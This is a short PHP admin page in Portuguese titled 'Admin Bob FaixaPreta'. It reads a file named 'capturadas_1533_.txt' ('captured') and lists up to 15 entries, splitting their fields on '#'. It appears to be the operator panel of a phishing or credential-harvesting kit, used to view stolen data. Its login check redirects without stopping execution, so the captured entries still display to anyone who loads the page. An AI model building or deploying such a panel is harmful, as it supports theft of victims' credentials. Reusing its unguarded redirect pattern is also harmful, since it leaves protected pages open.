<?php

error_reporting(0);

ini_set("display_errors", 0 );

session_start();

if ($_SESSION['logado'] !== true){
   header('Location: /admin/login.php');
}

$_SESSION["continua"] = true;

$conteudo = explode("\n", file_get_contents("capturadas_1533_.txt"));

?>
<html lang="pt-BR">
<head>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#000">
   <link rel="stylesheet" href="style.css" type="text/css">
   <style type="text/css">
* {
    padding: 0;
    margin:0;
}

body {
    background-image: url(/admin/imagens/fundo.png);
    background-size: cover;
}

.box1 {
    background-color: rgba(0,0,0,.6);
    padding: 11px;
    margin: 4% 4% 6% 4%;
    border-radius: 5px;
}

.titulo {
    text-align: center;
    text-shadow: 3px -3px 8px red;
    font-size: 22px;
    font-weight: 900;
    color: white;
    opacity: 1;
}

hr {
    margin: 10px 5%;
    border-color: #fff;
}
p {
    margin: 0 11%;
    color: white;
    font-size: 12px;
    font-weight: 700;
    text-shadow: 1px -1px 1px #000, -1px 1px 1px #000;
}
   </style>
</head>
<body>
   <div class="box1">
      <center>
         <div class="titulo">
            Admin Bob FaixaPreta
         </div>
      </center>
      <hr>
      <?php
         for ($n = 0; $n < 15; $n++) {
            if ($conteudo[$n] == "" or $conteudo[$n] == " "){
               break;
            }

            $linha = explode("#", $conteudo[$n]);

            echo "<p>[".($n + 1)."] ->> ".$linha[0];

            for ($n2 = 1; $n2 < count($linha); $n2++){
               echo "<br>".$linha[$n2];
            }

            echo "</p><hr>";

         }
      ?>
   </div>
</body>
</html>
